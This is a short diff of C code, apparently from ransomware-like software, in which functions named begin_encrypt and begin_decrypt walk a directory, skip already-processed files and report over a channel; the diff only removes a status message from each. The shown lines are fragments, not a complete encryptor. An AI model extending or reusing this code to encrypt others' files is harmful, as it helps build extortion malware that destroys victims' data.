@@ -44,7 +44,6 @@ int begin_encrypt(int channel, char *path, char *key, char *iv)
     char *newName, *toVisit;
     FILE *old, *newone;
 
-    send_channel(channel, "Beginning crypto operations...\n")
     while ((dir = readdir(dr)) != NULL) {
         if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0 && strstr(dir->d_name, ext) == NULL) {
             toVisit = linkStr(path, dir->d_name, 1);
@@ -83,7 +82,6 @@ int begin_decrypt(int channel, char *path, char *key, char *iv)
     char *newName, *toVisit;
     FILE *old, *newone;
 
-    send_channel(channel, "Beginning crypto operations...\n")
     while ((dir = readdir(dr)) != NULL) {
         if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0) {
             toVisit = linkStr(path, dir->d_name, 1);
